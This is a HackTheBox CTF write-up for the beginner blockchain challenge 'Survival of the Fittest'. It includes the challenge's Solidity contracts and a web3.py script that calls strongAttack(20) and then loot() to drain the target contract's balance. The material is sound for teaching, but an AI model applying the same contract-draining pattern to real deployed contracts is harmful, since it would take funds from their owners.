# Survival of the Fittest — HackTheBox Blockchain Challenge Writeup

**Challenge**: Survival of the Fittest  
**Difficulty**: Very Easy  
**Category**: Blockchain  

---

## Challenge Description

> Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster.

This is a beginner-friendly blockchain challenge where you need to defeat a monster and claim its loot.

---

## Initial Reconnaissance

After spawning the instance, I got the connection details:
- RPC URL
- Private key
- Target contract address

First thing I did was check what contracts were provided. There were two main files:

### Setup.sol
```solidity
contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }
    
    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```

This told me the win condition: drain the Creature contract's balance to 0.

### Creature.sol
```solidity
contract Creature {
    
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 20;
    }

    function strongAttack(uint256 _damage) external{
        _dealDamage(_damage);
    }
    
    function punch() external {
        _dealDamage(1);
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _dealDamage(uint256 _damage) internal {
        aggro = msg.sender;
        lifePoints -= _damage;
    }
}
```

---

## Analyzing the Vulnerability

Looking at the `Creature` contract, I noticed something interesting in the `_dealDamage` function:

```solidity
function _dealDamage(uint256 _damage) internal {
    aggro = msg.sender;
    lifePoints -= _damage;
}
```

Wait... there's no check here! The function just does `lifePoints -= _damage` without checking if `_damage` is valid or if `lifePoints` would go negative.

At first, I thought this might be an integer underflow vulnerability, but then I remembered this contract uses Solidity 0.8.13:

```solidity
pragma solidity ^0.8.13;
```

Solidity 0.8+ has built-in overflow/underflow protection, so if I tried to pass a damage value greater than `lifePoints`, the transaction would revert.

### The "Vulnerability"

Actually, this isn't really a vulnerability at all. It's just... straightforward game logic. The creature starts with 20 HP, and I can call `strongAttack` with any damage value up to 20. There's no access control preventing me from attacking.

So the solution is simple:
1. Call `strongAttack(20)` to reduce lifePoints to 0
2. Call `loot()` to claim the contract's balance

The "trick" (if you can call it that) is realizing you don't need to call `punch()` 20 times. You can just deal all the damage at once with `strongAttack(20)`.

---

## Prerequisites

Before running the solution, make sure you have:
- Python 3.x installed
- web3.py library (`pip install web3`)
- An active HTB instance (instances expire after some time)

## Exploitation

I wrote a Python script using web3.py to interact with the contract. The script includes error handling to check if the contract exists and the instance is still active.

### Setting Up

First, update the connection details from your HTB instance:

```python
RPC_URL = "http://94.237.123.119:37206/rpc"  # From HTB instance
PRIVATE_KEY = "0x..."  # Your player private key
TARGET_ADDRESS = "0x..."  # The Creature contract address
```

### The ABI

I only included the functions we actually need to call:

```python
CREATURE_ABI = [
    {"inputs": [], "name": "lifePoints", "outputs": [{"type": "uint256"}], 
     "stateMutability": "view", "type": "function"},
    {"inputs": [{"name": "_damage", "type": "uint256"}], "name": "strongAttack", 
     "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "loot", "outputs": [], 
     "stateMutability": "nonpayable", "type": "function"}
]
```

### Step 1: Connect and Validate

The script first connects to the RPC and verifies the contract exists:

```python
w3 = Web3(Web3.HTTPProvider(RPC_URL))

if not w3.is_connected():
    print("Failed to connect to RPC!")
    return

# Check if contract exists (important for expired instances)
code = w3.eth.get_code(TARGET_ADDRESS)
if code == b'' or code == '0x':
    print("Contract not found - instance might have expired")
    return
```

### Step 2: Check Initial State

Read the creature's current state:

```python
account = w3.eth.account.from_key(PRIVATE_KEY)
creature = w3.eth.contract(address=TARGET_ADDRESS, abi=CREATURE_ABI)

life_points = creature.functions.lifePoints().call()  # Returns: 20
balance = w3.eth.get_balance(TARGET_ADDRESS)  # Returns: 10 wei
```

### Step 3: Attack the Creature

Call `strongAttack(20)` to reduce lifePoints from 20 to 0:

```python
attack_tx = creature.functions.strongAttack(20).build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})

signed_attack = account.sign_transaction(attack_tx)
attack_hash = w3.eth.send_raw_transaction(signed_attack.raw_transaction)
attack_receipt = w3.eth.wait_for_transaction_receipt(attack_hash)

if attack_receipt['status'] != 1:
    print("Attack failed!")
    return
```

### Step 4: Verify and Loot

After the attack, verify HP is 0 then call `loot()`:

```python
life_points = creature.functions.lifePoints().call()  # Now: 0

loot_tx = creature.functions.loot().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address),
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})

signed_loot = account.sign_transaction(loot_tx)
loot_hash = w3.eth.send_raw_transaction(signed_loot.raw_transaction)
loot_receipt = w3.eth.wait_for_transaction_receipt(loot_hash)

final_balance = w3.eth.get_balance(TARGET_ADDRESS)  # Should be: 0
```

The `loot()` function transfers the entire balance to our address since `lifePoints == 0`.

---

## Running the Solution

1. **Spawn a new HTB instance** (if needed)
2. **Update the credentials** in `solve.py`:
   - `RPC_URL`
   - `PRIVATE_KEY`
   - `TARGET_ADDRESS`
3. **Run the script**:

```bash
python solve.py
```

### Expected Output

```
Connected to RPC
Life Points: 20
Balance: 10 wei
Attack tx: 0x...
Life Points now: 0
Loot tx: 0x...
Final Balance: 0 wei
Done!
```

If the instance has expired, you'll see:
```
Connected to RPC
Contract not found at 0x...
The instance might have expired. Spawn a new one and update the addresses.
```

Flag obtained! HTB{...}

---

## Key Takeaways

1. **Read the code carefully**: The solution was straightforward once I understood what the contract actually does.

2. **Understand Solidity versions**: Knowing that 0.8+ has overflow protection saved me from going down the wrong path initially.

3. **Check win conditions first**: The `isSolved()` function in Setup.sol clearly shows what needs to happen - drain the contract balance to 0.

4. **Instance management**: HTB blockchain instances expire after some time. Always check if the contract exists before trying to interact with it.

5. **Use proper tooling**: web3.py made it easy to interact with the contract programmatically without needing Foundry.

### What I Learned

This was a great introductory challenge for the HackTheBox Blockchain track. It teaches:
- **RPC Connection**: How to connect to an Ethereum node via HTTP
- **Contract Interaction**: Reading state variables and calling functions
- **Transaction Flow**: Building, signing, and sending transactions
- **ABI Usage**: How to construct minimal ABIs for specific functions
- **Error Handling**: Checking transaction receipts and contract existence
- **Solidity Basics**: Understanding state variables, require statements, and arithmetic operations

### Common Issues

- **"Contract not found"**: Your instance expired - spawn a new one
- **"Failed to connect to RPC"**: Check if the RPC URL is correct and accessible
- **Transaction fails**: Make sure you have the correct TARGET_ADDRESS for the Creature contract (not Setup)

---

## Quick Reference

### Contract Functions Used
- `lifePoints()` - View function, returns current HP (starts at 20)
- `strongAttack(uint256 _damage)` - Deals damage to the creature
- `loot()` - Transfers contract balance if HP is 0

### Transaction Flow
1. `strongAttack(20)` → Sets lifePoints to 0
2. `loot()` → Transfers 10 wei to caller
3. Contract balance becomes 0 → Challenge solved

### File Structure
```
Survival of the Fittest/
├── Creature.sol      # Target contract with game logic
├── Setup.sol         # Deployment & win condition checker
├── solve.py          # Python exploitation script
└── README.md         # This writeup
```

---

## Resources

- [Solidity Documentation](https://docs.soliditylang.org/) - Official Solidity language docs
- [web3.py Documentation](https://web3py.readthedocs.io/) - Python Ethereum library
- [HackTheBox Platform](https://www.hackthebox.com/) - CTF challenges
- [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) - Deep dive into Ethereum

**Challenge Rating**: ⭐⭐☆☆☆ (Very Easy - Perfect first blockchain challenge!)

**Time to Solve**: ~5-10 minutes once you understand the code

---

*If you found this writeup helpful, feel free to check out my other CTF solutions!*
